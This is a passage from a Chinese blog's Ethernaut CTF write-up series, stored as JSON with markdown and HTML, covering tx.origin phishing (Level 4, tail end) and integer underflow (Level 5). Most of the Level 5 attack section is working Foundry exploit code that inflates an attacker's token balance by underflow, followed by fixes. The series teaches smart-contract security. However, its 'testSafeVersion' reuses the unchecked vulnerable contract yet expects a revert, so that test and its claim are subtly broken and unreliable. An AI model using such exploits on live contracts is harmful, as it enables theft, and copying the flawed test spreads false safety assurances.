class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(telephone.owner(), newOwner);</span><br><span class=\"line\">        console.log(&quot;Attack successful! New owner:&quot;, telephone.owner());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"使用-msg-sender-进行身份验证\"><a href=\"#使用-msg-sender-进行身份验证\" class=\"headerlink\" title=\"使用 msg.sender 进行身份验证\"></a>使用 msg.sender 进行身份验证</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureTelephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function changeOwner(address _newOwner) public onlyOwner &#123;</span><br><span class=\"line\">        owner = _newOwner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Telephone 关卡教导我们：</p>\n<ul>\n<li>✅ 永远不要使用 <code>tx.origin</code> 进行身份验证</li>\n<li>✅ 使用 <code>msg.sender</code> 进行安全的身份检查</li>\n<li>✅ 理解调用链中的身份传递机制</li>\n</ul>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">上一关: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">下一关: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 5: Token - 整数下溢攻击详解","date":"2025-01-25T07:10:00.000Z","updated":"2025-01-25T07:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习整数下溢攻击的原理和危害，了解 SafeMath 库的重要性和现代 Solidity 的内置保护机制。","_content":"\n# 🎯 Ethernaut Level 5: Token - 整数下溢攻击详解\n\n> **关卡链接**: [Ethernaut Level 5 - Token](https://ethernaut.openzeppelin.com/level/5)  \n> **攻击类型**: 整数下溢攻击  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n1. **获得大量代币** - 从初始的 20 个代币增加到大量代币\n2. **理解整数溢出** - 掌握算术运算的安全问题\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address => uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // 🚨 漏洞：没有检查下溢出\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n```\n\n### 漏洞识别\n\n**整数下溢问题**：\n\n1. **无符号整数特性** - `uint` 类型不能为负数\n2. **下溢行为** - 当 `0 - 1` 时，结果变成 `2^256 - 1`\n3. **检查失效** - `require(balances[msg.sender] - _value >= 0)` 总是为真\n\n### 攻击原理\n\n```solidity\n// 假设用户余额为 20\nuint balance = 20;\nuint transferAmount = 21;\n\n// 下溢计算：20 - 21 = 2^256 - 1 (巨大的正数)\nuint result = balance - transferAmount;\n// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935\n\n// require 检查：巨大的正数 >= 0，总是为真\nrequire(result >= 0); // ✅ 通过检查\n```\n\n## 💻 Foundry 实现\n\n### 攻击测试代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// 复制原始有漏洞的合约 (使用 0.6.0 版本行为)\ncontract VulnerableToken {\n    mapping(address => uint) public balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // 故意使用不安全的算术运算\n        unchecked {\n            require(balances[msg.sender] - _value >= 0);\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n        }\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n\ncontract TokenTest is Test {\n    VulnerableToken public token;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public victim = makeAddr(\"victim\");\n\n    function setUp() public {\n        // 部署代币合约，初始供应量 1000\n        token = new VulnerableToken(1000);\n        \n        // 给攻击者 20 个代币\n        token.transfer(attacker, 20);\n    }\n\n    function testTokenUnderflowExploit() public {\n        console.log(\"=== 攻击前状态 ===\");\n        console.log(\"攻击者余额:\", token.balanceOf(attacker));\n        console.log(\"受害者余额:\", token.balanceOf(victim));\n        \n        vm.startPrank(attacker);\n        \n        // 🎯 关键攻击：转账超过余额的代币\n        uint256 transferAmount = 21; // 大于 20 的余额\n        token.transfer(victim, transferAmount);\n        \n        vm.stopPrank();\n        \n        console.log(\"=== 攻击后状态 ===\");\n        console.log(\"攻击者余额:\", token.balanceOf(attacker));\n        console.log(\"受害者余额:\", token.balanceOf(victim));\n        \n        // 验证下溢攻击成功\n        assertGt(token.balanceOf(attacker), 1000000); // 攻击者获得巨额代币\n        assertEq(token.balanceOf(victim), transferAmount);\n    }\n    \n    function testUnderflowMath() public view {\n        // 演示下溢计算\n        uint256 balance = 20;\n        uint256 transferAmount = 21;\n        \n        console.log(\"=== 下溢计算演示 ===\");\n        console.log(\"原始余额:\", balance);\n        console.log(\"转账金额:\", transferAmount);\n        \n        unchecked {\n            uint256 result = balance - transferAmount;\n            console.log(\"下溢结果:\", result);\n            console.log(\"最大 uint256:\", type(uint256).max);\n            console.log(\"是否相等:\", result == type(uint256).max);\n        }\n    }\n    \n    function testSafeVersion() public {\n        // 演示安全版本\n        VulnerableToken safeToken = new VulnerableToken(1000);\n        safeToken.transfer(attacker, 20);\n        \n        vm.startPrank(attacker);\n        \n        // 在 Solidity 0.8.0+ 中，这会 revert\n        vm.expectRevert(); // 期望交易失败\n        safeToken.transfer(victim, 21); // 这在新版本中会失败\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 运行测试\n\n```bash\nforge test --match-contract TokenTest -vvv\n```\n\n## 🛡️ 防御措施\n\n### 1. 使用 Solidity 0.8.0+\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SafeToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        // Solidity 0.8.0+ 自动检查溢出\n        balances[msg.sender] -= _value; // 自动 revert 如果下溢\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n### 2. 使用 SafeMath 库 (旧版本)\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract SafeTokenV6 {\n    using SafeMath for uint256;\n    \n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        balances[msg.sender] = balances[msg.sender].sub(_value); // 安全减法\n        balances[_to] = balances[_to].add(_value); // 安全加法\n        return true;\n    }\n}\n```\n\n### 3. 显式检查\n\n```solidity\ncontract ExplicitCheckToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        require(balances[msg.sender] >= _value, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n## 📚 核心知识点\n\n### 整数溢出类型\n\n| 类型 | 描述 | 示例 |\n|------|------|------|\n| **上溢** | 超过最大值 | `type(uint256).max + 1 = 0` |\n| **下溢** | 低于最小值 | `0 - 1 = type(uint256).max` |\n\n### Solidity 版本对比\n\n```solidity\n// Solidity 0.7.x 及以下\nfunction unsafeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // 可能溢出，无自动检查\n}\n\n// Solidity 0.8.0+\nfunction safeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // 自动检查溢出，溢出时 revert\n}\n\n// 显式不安全操作 (0.8.0+)\nfunction explicitUnsafe(uint a, uint b) public pure returns (uint) {\n    unchecked {\n        return a + b; // 显式跳过溢出检查\n    }\n}\n```\n\n### 安全数学运算\n\n```solidity\n// ✅ 安全的余额检查\nfunction safeTransfer(address _to, uint256 _value) public {\n    require(balances[msg.sender] >= _value, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n}\n\n// ✅ 使用 SafeMath (旧版本)\nfunction safeTransferLegacy(address _to, uint256 _value) public {\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n}\n```\n\n## 🏛️ 历史案例\n\n### 著名的整数溢出攻击\n\n1. **PoWHCoin** (2018)\n   - 攻击者利用整数溢出获得巨额代币\n   - 导致项目完全崩溃\n\n2. **BeautyChain (BEC)** (2018)\n   - BatchOverFlow 漏洞\n   - 造成代币价值归零\n\n3. **SMT Token** (2018)\n   - 类似的批量转账溢出漏洞\n   - 交易所暂停交易\n\n## 🎯 总结\n\nToken 关卡揭示了早期 Solidity 的重要安全隐患：\n\n- ✅ **整数溢出的严重后果** - 可以完全破坏代币经济学\n- ✅ **版本升级的重要性** - Solidity 0.8.0+ 提供内置保护\n- ✅ **SafeMath 的历史价值** - 在旧版本中提供安全保护\n- ✅ **显式检查的必要性** - 总是验证关键假设\n\n这个看似简单的算术错误，实际上影响了无数 DeFi 项目的安全性设计。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[下一关: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","source":"_posts/ethernaut-level-05-token.md","raw":"---\ntitle: 'Ethernaut Level 5: Token - 整数下溢攻击详解'\ndate: 2025-01-25 15:10:00\nupdated: 2025-01-25 15:10:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - 整数下溢\n  - 算术溢出\n  - SafeMath\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习整数下溢攻击的原理和危害，了解 SafeMath 库的重要性和现代 Solidity 的内置保护机制。\"\n---\n\n# 🎯 Ethernaut Level 5: Token - 整数下溢攻击详解\n\n> **关卡链接**: [Ethernaut Level 5 - Token](https://ethernaut.openzeppelin.com/level/5)  \n> **攻击类型**: 整数下溢攻击  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n1. **获得大量代币** - 从初始的 20 个代币增加到大量代币\n2. **理解整数溢出** - 掌握算术运算的安全问题\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address => uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // 🚨 漏洞：没有检查下溢出\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n```\n\n### 漏洞识别\n\n**整数下溢问题**：\n\n1. **无符号整数特性** - `uint` 类型不能为负数\n2. **下溢行为** - 当 `0 - 1` 时，结果变成 `2^256 - 1`\n3. **检查失效** - `require(balances[msg.sender] - _value >= 0)` 总是为真\n\n### 攻击原理\n\n```solidity\n// 假设用户余额为 20\nuint balance = 20;\nuint transferAmount = 21;\n\n// 下溢计算：20 - 21 = 2^256 - 1 (巨大的正数)\nuint result = balance - transferAmount;\n// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935\n\n// require 检查：巨大的正数 >= 0，总是为真\nrequire(result >= 0); // ✅ 通过检查\n```\n\n## 💻 Foundry 实现\n\n### 攻击测试代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// 复制原始有漏洞的合约 (使用 0.6.0 版本行为)\ncontract VulnerableToken {\n    mapping(address => uint) public balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // 故意使用不安全的算术运算\n        unchecked {\n            require(balances[msg.sender] - _value >= 0);\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n        }\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n\ncontract TokenTest is Test {\n    VulnerableToken public token;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public victim = makeAddr(\"victim\");\n\n    function setUp() public {\n        // 部署代币合约，初始供应量 1000\n        token = new VulnerableToken(1000);\n        \n        // 给攻击者 20 个代币\n        token.transfer(attacker, 20);\n    }\n\n    function testTokenUnderflowExploit() public {\n        console.log(\"=== 攻击前状态 ===\");\n        console.log(\"攻击者余额:\", token.balanceOf(attacker));\n        console.log(\"受害者余额:\", token.balanceOf(victim));\n        \n        vm.startPrank(attacker);\n        \n        // 🎯 关键攻击：转账超过余额的代币\n        uint256 transferAmount = 21; // 大于 20 的余额\n        token.transfer(victim, transferAmount);\n        \n        vm.stopPrank();\n        \n        console.log(\"=== 攻击后状态 ===\");\n        console.log(\"攻击者余额:\", token.balanceOf(attacker));\n        console.log(\"受害者余额:\", token.balanceOf(victim));\n        \n        // 验证下溢攻击成功\n        assertGt(token.balanceOf(attacker), 1000000); // 攻击者获得巨额代币\n        assertEq(token.balanceOf(victim), transferAmount);\n    }\n    \n    function testUnderflowMath() public view {\n        // 演示下溢计算\n        uint256 balance = 20;\n        uint256 transferAmount = 21;\n        \n        console.log(\"=== 下溢计算演示 ===\");\n        console.log(\"原始余额:\", balance);\n        console.log(\"转账金额:\", transferAmount);\n        \n        unchecked {\n            uint256 result = balance - transferAmount;\n            console.log(\"下溢结果:\", result);\n            console.log(\"最大 uint256:\", type(uint256).max);\n            console.log(\"是否相等:\", result == type(uint256).max);\n        }\n    }\n    \n    function testSafeVersion() public {\n        // 演示安全版本\n        VulnerableToken safeToken = new VulnerableToken(1000);\n        safeToken.transfer(attacker, 20);\n        \n        vm.startPrank(attacker);\n        \n        // 在 Solidity 0.8.0+ 中，这会 revert\n        vm.expectRevert(); // 期望交易失败\n        safeToken.transfer(victim, 21); // 这在新版本中会失败\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 运行测试\n\n```bash\nforge test --match-contract TokenTest -vvv\n```\n\n## 🛡️ 防御措施\n\n### 1. 使用 Solidity 0.8.0+\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SafeToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        // Solidity 0.8.0+ 自动检查溢出\n        balances[msg.sender] -= _value; // 自动 revert 如果下溢\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n### 2. 使用 SafeMath 库 (旧版本)\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract SafeTokenV6 {\n    using SafeMath for uint256;\n    \n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        balances[msg.sender] = balances[msg.sender].sub(_value); // 安全减法\n        balances[_to] = balances[_to].add(_value); // 安全加法\n        return true;\n    }\n}\n```\n\n### 3. 显式检查\n\n```solidity\ncontract ExplicitCheckToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        require(balances[msg.sender] >= _value, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n## 📚 核心知识点\n\n### 整数溢出类型\n\n| 类型 | 描述 | 示例 |\n|------|------|------|\n| **上溢** | 超过最大值 | `type(uint256).max + 1 = 0` |\n| **下溢** | 低于最小值 | `0 - 1 = type(uint256).max` |\n\n### Solidity 版本对比\n\n```solidity\n// Solidity 0.7.x 及以下\nfunction unsafeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // 可能溢出，无自动检查\n}\n\n// Solidity 0.8.0+\nfunction safeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // 自动检查溢出，溢出时 revert\n}\n\n// 显式不安全操作 (0.8.0+)\nfunction explicitUnsafe(uint a, uint b) public pure returns (uint) {\n    unchecked {\n        return a + b; // 显式跳过溢出检查\n    }\n}\n```\n\n### 安全数学运算\n\n```solidity\n// ✅ 安全的余额检查\nfunction safeTransfer(address _to, uint256 _value) public {\n    require(balances[msg.sender] >= _value, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n}\n\n// ✅ 使用 SafeMath (旧版本)\nfunction safeTransferLegacy(address _to, uint256 _value) public {\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n}\n```\n\n## 🏛️ 历史案例\n\n### 著名的整数溢出攻击\n\n1. **PoWHCoin** (2018)\n   - 攻击者利用整数溢出获得巨额代币\n   - 导致项目完全崩溃\n\n2. **BeautyChain (BEC)** (2018)\n   - BatchOverFlow 漏洞\n   - 造成代币价值归零\n\n3. **SMT Token** (2018)\n   - 类似的批量转账溢出漏洞\n   - 交易所暂停交易\n\n## 🎯 总结\n\nToken 关卡揭示了早期 Solidity 的重要安全隐患：\n\n- ✅ **整数溢出的严重后果** - 可以完全破坏代币经济学\n- ✅ **版本升级的重要性** - Solidity 0.8.0+ 提供内置保护\n- ✅ **SafeMath 的历史价值** - 在旧版本中提供安全保护\n- ✅ **显式检查的必要性** - 总是验证关键假设\n\n这个看似简单的算术错误，实际上影响了无数 DeFi 项目的安全性设计。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[下一关: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","slug":"ethernaut-level-05-token","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp3000ibf5q6yc88quu","content":"<h1 id=\"🎯-Ethernaut-Level-5-Token-整数下溢攻击详解\"><a href=\"#🎯-Ethernaut-Level-5-Token-整数下溢攻击详解\" class=\"headerlink\" title=\"🎯 Ethernaut Level 5: Token - 整数下溢攻击详解\"></a>🎯 Ethernaut Level 5: Token - 整数下溢攻击详解</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/5\">Ethernaut Level 5 - Token</a><br><strong>攻击类型</strong>: 整数下溢攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><ol>\n<li><strong>获得大量代币</strong> - 从初始的 20 个代币增加到大量代币</li>\n<li><strong>理解整数溢出</strong> - 掌握算术运算的安全问题</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Token &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) public &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // 🚨 漏洞：没有检查下溢出</span><br><span class=\"line\">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p><strong>整数下溢问题</strong>：</p>\n<ol>\n<li><strong>无符号整数特性</strong> - <code>uint</code> 类型不能为负数</li>\n<li><strong>下溢行为</strong> - 当 <code>0 - 1</code> 时，结果变成 <code>2^256 - 1</code></li>\n<li><strong>检查失效</strong> - <code>require(balances[msg.sender] - _value &gt;= 0)</code> 总是为真</li>\n</ol>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 假设用户余额为 20</span><br><span class=\"line\">uint balance = 20;</span><br><span class=\"line\">uint transferAmount = 21;</span><br><span class=\"line\"></span><br><span class=\"line\">// 下溢计算：20 - 21 = 2^256 - 1 (巨大的正数)</span><br><span class=\"line\">uint result = balance - transferAmount;</span><br><span class=\"line\">// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class=\"line\"></span><br><span class=\"line\">// require 检查：巨大的正数 &gt;= 0，总是为真</span><br><span class=\"line\">require(result &gt;= 0); // ✅ 通过检查</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击测试代码\"><a href=\"#攻击测试代码\" class=\"headerlink\" title=\"攻击测试代码\"></a>攻击测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 复制原始有漏洞的合约 (使用 0.6.0 版本行为)</span><br><span class=\"line\">contract VulnerableToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // 故意使用不安全的算术运算</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">            balances[msg.sender] -= _value;</span><br><span class=\"line\">            balances[_to] += _value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TokenTest is Test &#123;</span><br><span class=\"line\">    VulnerableToken public token;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public victim = makeAddr(&quot;victim&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署代币合约，初始供应量 1000</span><br><span class=\"line\">        token = new VulnerableToken(1000);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给攻击者 20 个代币</span><br><span class=\"line\">        token.transfer(attacker, 20);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTokenUnderflowExploit() public &#123;</span><br><span class=\"line\">        